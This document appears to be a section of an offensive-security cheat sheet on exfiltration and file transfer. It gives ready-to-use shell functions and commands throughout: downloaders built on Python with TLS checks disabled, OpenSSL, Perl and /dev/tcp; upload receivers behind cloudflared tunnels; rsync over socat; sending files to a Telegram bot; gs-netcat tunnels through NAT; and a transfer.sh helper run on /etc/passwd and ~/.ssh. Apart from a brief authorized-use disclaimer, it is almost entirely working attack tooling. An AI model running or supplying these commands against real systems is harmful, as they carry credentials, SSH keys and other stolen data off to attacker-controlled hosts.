# 06 — Exfil & File Transfer

> Authorized use only. Exfiltrate only data within the engagement's scope. Encrypt loot in
> transit and at rest (see `09-crypto.md`).

---

## §encoding — Encode a file for cut-&-paste transfer

When the target has no internet, convert binary → ASCII and paste.

```bash
# base64 (most common)
base64 -w0 </etc/issue.net              # encode (pipe to xclip for clipboard)
base64 -d >issue.net-COPY               # decode on other end

# uuencode / uudecode
uuencode /etc/issue.net issue.net-COPY
uudecode                                # paste the 3 lines

# openssl base64
openssl base64 </etc/issue.net
openssl base64 -d >issue.net-COPY

# xxd hex
xxd -p </etc/issue.net
xxd -p -r >issue.net-COPY
```

**Paste into a file on remote (safe heredoc):**
```bash
cat >output.txt <<-'__EOF__'
[...]
__EOF__
```

---

## §terminal-transfer — Transfer via tmux/screen (no direct connection)

**tmux — LOCAL→REMOTE (upload):**
```bash
# on REMOTE: base64 -d >screen-xfer.txt   (rename session: Ctrl-b $  → 'foo')
# on LOCAL (different terminal):
tmux send-keys -t foo "$(base64 -w64 </etc/issue.net)"$'\n'
# then Ctrl-d in the receiving terminal
```

**screen — REMOTE→LOCAL (download):**
```bash
# local screen: CTRL-a : logfile screen-xfer.txt   then  CTRL-a H  (start logging)
# remote: openssl base64 </etc/issue.net
# local: CTRL-a H (stop) ; openssl base64 -d <screen-xfer.txt ; rm -rf screen-xfer.txt
```

**screen — LOCAL→REMOTE (upload):**
```bash
# local: openssl base64 </etc/issue.net >screen-xfer.txt
# remote (in screen): openssl base64 -d
# local: CTRL-a : readbuf screen-xfer.txt   CTRL-a : paste .   CTRL-d CTRL-d
```

---

## §no-curl — Download without curl/wget

**Python (`purl`):**
```bash
purl() {
    local url="${1:?}"
    { [[ "${url:0:8}" == "https://" ]] || [[ "${url:0:7}" == "http://" ]]; } || url="https://${url}"
    "$(which python3 || which python || which python2 || which false)" -c "\
import urllib.request,sys,ssl
ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
sys.stdout.buffer.write(urllib.request.urlopen(\"$url\", timeout=10, context=ctx).read())"
}
```

**OpenSSL (`surl`):**
```bash
surl() {
    local r="${1#*://}"; local opts=("-quiet" "-ign_eof")
    IFS=/ read -r host query <<<"${r}"
    openssl s_client --help 2>&1|grep -qFm1 -- -ignore_unexpected_eof && opts+=("-ignore_unexpected_eof")
    openssl s_client --help 2>&1|grep -qFm1 -- -verify_quiet && opts+=("-verify_quiet")
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host%%:*}\r\n\r\n" \
      | openssl s_client "${opts[@]}" -connect "${host%%:*}:443" | sed '1,/^\r\{0,1\}$/d'
}
```

**Perl (`lurl`):**
```bash
lurl() { perl -e 'use LWP::Simple qw(get); print(get $ARGV[0]);' "${1:?}"; }
```

**Bash /dev/tcp (`burl`):**
```bash
burl() {
    IFS=/ read -r proto x host query <<<"$1"
    exec 3<>"/dev/tcp/${host}/${PORT:-80}"
    echo -en "GET /${query} HTTP/1.0\r\nHost: ${host}\r\n\r\n" >&3
    (while read -r l; do echo >&2 "$l"; [[ $l == $'\r' ]] && break; done && cat) <&3
    exec 3>&-
}
# PORT=31337 burl http://1.2.3.4/blah.tar.gz >blah.tar.gz
```

---

## §http-upload — HTTP upload server (receiver)

**PHP:**
```bash
# receiver:
curl -fsSL -o upload_server.php https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/upload_server.php
mkdir upload && (cd upload; php -S 127.0.0.1:8080 ../upload_server.php &>/dev/null &)
cloudflared tunnel --url localhost:8080 --no-autoupdate
# sender:
up() { curl -fsSL -F "file=@${1:?}" https://<URL>.trycloudflare.com; }
up warez.tar.gz
```

**Python:**
```bash
# receiver: pip install uploadserver && python -m uploadserver & ; cloudflared tunnel -url localhost:8000
# sender: curl -X POST https://<URL>.trycloudflare.com/upload -F 'files=@myfile.txt'
```

**Simple download server (share cwd):**
```bash
python -m http.server 8080 --bind 127.0.0.1 &   # or: php -S 127.0.0.1:8080
cloudflared tunnel -url localhost:8080
```

---

## §rsync — Large dirs, resumable

**Cleartext:**
```bash
# receiver:
echo -e "[up]\npath=upload\nread only=false\nuid=$(id -u)\ngid=$(id -g)" >r.conf
mkdir upload && rsync --daemon --port=31337 --config=r.conf --no-detach
# sender: rsync -av warez rsync://1.2.3.4:31337/up
```

**Encrypted (OpenSSL + socat):**
```bash
# receiver:
openssl req -subj '/CN=example.com/O=EL/C=XX' -new -newkey ed25519 -days 14 -nodes -x509 -keyout ssl.key -out ssl.crt
cat ssl.key ssl.crt >ssl.pem && rm -f ssl.key ssl.crt && mkdir upload
socat OPENSSL-LISTEN:31337,reuseaddr,fork,cert=ssl.pem,cafile=ssl.pem EXEC:"rsync --server -logtprR --safe-links --partial upload"
# sender (copy ssl.pem over first):
up1() { rsync -ahPRv -e "bash -c 'socat - OPENSSL-CONNECT:${IP:?}:${PORT:-31337},cert=ssl.pem,cafile=ssl.pem,verify=0' #" -- "$@" 0:; }
up1 /var/www/./warez
```

---

## §webdav — WebDAV share

```bash
# receiver: cloudflared tunnel --url localhost:8080 & ; wsgidav --port=8080 --root=. --auth=anonymous
# sender:
curl -T file.dat https://<URL>.trycloudflare.com
curl -X MKCOL https://<URL>.trycloudflare.com/sources
find . -name '*.c' | xargs -P10 -I{} curl -T{} https://<URL>.trycloudflare.com/sources/{}
# Windows: \\<URL>.trycloudflare.com@SSL\sources   or   net use * \\<URL>.trycloudflare.com@SSL\sources
```

---

## §telegram — Exfil to Telegram

```bash
# get chat_id:
curl -s "https://api.telegram.org/bot<TG-BOT-TOKEN>/getUpdates" | jq -r '.result[].message.chat.id' | uniq
# upload file:
curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocument?chat_id=<TG-CHAT-ID>"
```

---

## §gsocket-sftp — SFTP through NAT via gsocket

```bash
# host behind NAT: gs-netcat -s MySecret -l -e /usr/lib/sftp-server
# workstation: export GSOCKET_ARGS="-s MySecret" ; sftp -D gs-netcat
# single file dump:
#   sender:   gs-netcat -l <"FILENAME"     (prints a SECRET)
#   receiver: gs-netcat >"FILENAME"        (enter SECRET)
```

---

## §public-dump — Public transfer services

```bash
transfer() {
    [[ $# -eq 0 ]] && { echo -e >&2 "Usage: transfer [file/dir] | transfer [name] <FILE"; return 255; }
    [[ ! -t 0 ]] && { curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1}"; return; }
    [[ ! -e "$1" ]] && { echo -e >&2 "Not found: $1"; return 255; }
    [[ -d "$1" ]] && { (cd "${1}/.."; tar cfz - "${1##*/}")|curl -SsfL --progress-bar -T "-" "https://transfer.sh/${1##*/}.tar.gz"; return; }
    curl -SsfL --progress-bar -T "$1" "https://transfer.sh/${1##*/}"
}
transfer /etc/passwd
transfer ~/.ssh
```
**OPSEC:** public dumps are third-party — only for non-sensitive CTF loot, never client data.
